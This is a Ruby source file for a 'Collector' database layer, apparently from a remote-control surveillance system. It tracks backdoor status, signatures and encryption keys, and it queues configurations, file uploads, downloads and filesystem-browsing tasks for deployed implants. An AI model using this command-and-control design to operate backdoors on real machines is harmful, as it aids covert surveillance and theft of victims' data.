#
#  The DB abstraction layer
#

# relatives
require_relative 'config.rb'
require_relative 'db_xmlrpc.rb'
require_relative 'cache.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'digest/md5'
require 'singleton'
require 'uuidtools'

module RCS
module Collector

class DB
  include Singleton
  include RCS::Tracer

  ACTIVE_BACKDOOR = 0
  DELETED_BACKDOOR = 1
  CLOSED_BACKDOOR = 2
  QUEUED_BACKDOOR = 3
  NO_SUCH_BACKDOOR = 4
  UNKNOWN_BACKDOOR = 5
  
  attr_reader :backdoor_signature

  def initialize
    # database address
    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s

    # the username is an unique identifier for each machine.
    # we use the MD5 of the MAC address
    #TODO: remove the RSS retro-compatibility
    @username = Digest::MD5.hexdigest(UUIDTools::UUID.mac_address.to_s) + "RSS"
    # the password is a signature taken from a file
    @password = File.read(Dir.pwd + "/config/" + Config.instance.global['DB_SIGN'])

    # status of the db connection
    @available = false

    # global (per customer) backdoor signature
    @backdoor_signature = nil
    @class_keys = {}
    
    # the current db layer to be used is the XML-RPC protocol
    # this will be replaced by DB_rabbitmq
    @db = DB_xmlrpc.new @host

    return @available
  end

  def connect!
    trace :info, "Checking the DB connection [#{@host}]..."
    if @db.login @username, @password then
      @available = true
      trace :info, "Connected to [#{@host}]"
    else
      @available = false
      trace :error, "Cannot login to DB"
    end
    return @available
  end

  def disconnect!
    @db.logout
    @available = false
    trace :info, "Disconnected from [#{@host}]"
  end

  def connected=(value)
    #TODO: set this variable accordingly in each method to detect when the db is down
    #@available = value
    if value == true then
      trace :info, "DB is up and running"
    else
      trace :warn, "DB is now considered NOT available"
    end

  end

  def connected?
    # is the database available ?
    return @available
  end

  def cache_init

    # if the db is available, clear the cache and populate it again
    if @available then
      trace :info, "Emptying the DB cache..."
      # empty the cache and populate it again
      Cache.empty!

      trace :info, "Populating the DB cache..."
      # get the global signature (per customer) for all the backdoors
      sig = @db.backdoor_signature
      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
      
      # get the classkey of every backdoor and store it in the cache
      @class_keys = @db.class_keys

      # save in the permanent cache
      Cache.signature = sig
      trace :info, "Backdoor signature saved in the DB cache"
      Cache.add_class_keys @class_keys
      trace :info, "#{@class_keys.length} entries saved in the the DB cache"

      return true
    end

    # the db is not available
    # check if the cache already exists and has some entries
    if Cache.length > 0 then
      trace :info, "Loading the DB cache..."

      # populate the memory cache from the permanent one
      @backdoor_signature = Digest::MD5.digest Cache.signature unless Cache.signature.nil?
      @class_keys = Cache.class_keys

      trace :info, "#{@class_keys.length} entries loaded from DB cache"

      return true
    end

    # no db and no cache...
    return false
  end

  def update_status(component, ip, status, message, stats)
    trace :debug, "update status: #{status} #{message} #{stats}"

    @db.update_status component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
  end

  def class_key_of(build_id)
    # if we already have it return otherwise we have to ask to the db
    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?

    trace :debug, "Cache Miss: class key for #{build_id}"
    
    # ask to the db the class key
    key = @db.class_keys build_id

    # save the class key in the cache (memory and permanent)
    if not key.nil? then
      @class_keys[build_id] = key

      # store it in the permanent cache
      entry = {}
      entry[build_id] = key
      Cache.add_class_keys entry

      # return the key
      return Digest::MD5.digest @class_keys[build_id]
    end

    # key not found
    return nil
  end

  # returns ALWAYS the status of a backdoor
  def status_of(build_id, instance_id, subtype)
    # if the database has gone, reply with a fake response in order for the sync to continue
    return DB::UNKNOWN_BACKDOOR, 0 if not @available

    trace :debug, "Asking the status of [#{build_id}] to the db"

    status = DB::UNKNOWN_BACKDOOR
    bid = 0
    
    # ask the database the status of the backdoor
    begin
      status, bid = @db.status_of(build_id, instance_id, subtype)
    rescue Timeout::Error
      self.connected = false
    end

    return status, bid
  end

  def sync_for(bid, version, user, device, source, time)
    # database is down, continue
    return if not @available

    # tell the db that the backdoor has synchronized
    @db.sync_for bid, version, user, device, source, time
  end

  def new_conf?(bid)
    # check if we have the config in the cache
    # probably and old one not yet sent
    return true if Cache.new_conf? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the config from the db
    cid, config = @db.new_conf bid

    # put the config in the cache
    Cache.save_conf bid, cid, config unless config.nil?

    return (config.nil?) ? false : true
  end

  def new_conf(bid)
    # retrieve the config from the cache
    cid, config = Cache.new_conf bid

    return nil if config.nil?

    # set the status to "sent" in the db
    @db.conf_sent cid

    # delete the conf from the cache
    Cache.del_conf bid

    return config
  end

  def new_uploads?(bid)
    # check if we have the uploads in the cache
    # probably and old one not yet sent
    return true if Cache.new_uploads? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the downloads from the db
    uploads = @db.new_uploads bid

    # put the config in the cache
    Cache.save_uploads bid, uploads unless uploads.empty?

    return (uploads.empty?) ? false : true
  end

  def new_uploads(bid)
    # retrieve the uploads from the cache
    upload, left = Cache.new_upload bid

    return nil if upload.nil?

    # delete from the db
    @db.del_upload upload[:id]
    # delete the conf from the cache
    Cache.del_upload upload[:id]

    return upload[:upload], left
  end

  def new_downloads?(bid)
    # check if we have the downloads in the cache
    # probably and old one not yet sent
    return true if Cache.new_downloads? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the downloads from the db
    downloads = @db.new_downloads bid

    # put the config in the cache
    Cache.save_downloads bid, downloads unless downloads.empty?

    return (downloads.empty?) ? false : true
  end

  def new_downloads(bid)
    # retrieve the downloads from the cache
    downloads = Cache.new_downloads bid

    return [] if downloads.empty?

    down = []
    # remove the downloads from the db
    downloads.each_pair do |key, value|
      # delete the entry from the db
      @db.del_download key
      # return only the filename
      down << value
    end

    # delete the conf from the cache
    Cache.del_downloads bid

    return down
  end

  def new_filesystems?(bid)
    # check if we have the filesystems in the cache
    # probably and old one not yet sent
    return true if Cache.new_filesystems? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the downloads from the db
    filesystems = @db.new_filesystems bid

    # put the config in the cache
    Cache.save_filesystems bid, filesystems unless filesystems.empty?

    return (filesystems.empty?) ? false : true
  end

  def new_filesystems(bid)
    # retrieve the filesystems from the cache
    filesystems = Cache.new_filesystems bid

    return [] if filesystems.empty?

    files = []
    # remove the filesystems from the db
    filesystems.each_pair do |key, value|
      # delete the entry from the db
      @db.del_filesystem key
      # return only the {:depth => , :path => } hash
      files << value
    end

    # delete the conf from the cache
    Cache.del_filesystems bid

    return files
  end

end #DB

end #Collector::
end #RCS::